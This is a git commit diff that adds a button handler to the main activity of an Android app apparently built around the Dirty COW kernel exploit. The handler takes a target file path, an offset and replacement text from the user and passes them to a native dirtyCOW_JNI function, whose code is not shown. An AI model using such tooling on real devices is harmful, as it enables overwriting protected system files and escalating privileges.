4ea63fea47548415d35b4c326cda1413572d6df7
AndrewRuggeri <andr.ruggeri@gmail.com>
2018-01-12 19:30:36 -0500

    added UX button click event to call dirtyCOW C function

--- app/src/main/java/com/example/avr/androiddirtycow/MainActivity.java
+++ app/src/main/java/com/example/avr/androiddirtycow/MainActivity.java
@@ -1,8 +1,15 @@
 package com.example.avr.androiddirtycow;
 
+import android.content.Context;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.EditText;
 import android.widget.TextView;
+import android.widget.Toast;
+
+import java.util.Locale;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -14,7 +21,41 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-//        setContentView(R.layout.activity_main);
+        setContentView(R.layout.activity_main);
+
+
+        // Get Button to Add Click Event
+        Button button;
+        button = (Button)findViewById(R.id.buttonGo);
+
+        // Add Click Event
+        button.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+
+                // Get Values from TextBoxes
+                EditText editTextFile = findViewById(R.id.editTextFilePath);
+                EditText editTextOffset = findViewById(R.id.editTextOffset);
+                EditText editTextReplace = findViewById(R.id.editTextReplacementText);
+
+                String filePath = editTextFile.getText().toString();
+                int offset = Integer.parseInt(editTextOffset.getText().toString());
+                String replaceText = editTextReplace.getText().toString();
+
+
+                // Create & Display Toast Message
+                Context context = getApplicationContext();
+                String message = String.format(Locale.getDefault(),
+                        "DirtyCOW: %s, %d, %s", filePath, offset, replaceText);
+
+                Toast toastMessage = Toast.makeText(context, message, Toast.LENGTH_LONG);
+                toastMessage.show();
+
+
+                // Call JNI DirtyCOW function
+                dirtyCOW_JNI(filePath, offset, replaceText);
+            }
+        });
 
         // Example of a call to a native method
 //        TextView tv = (TextView) findViewById(R.id.sample_text);
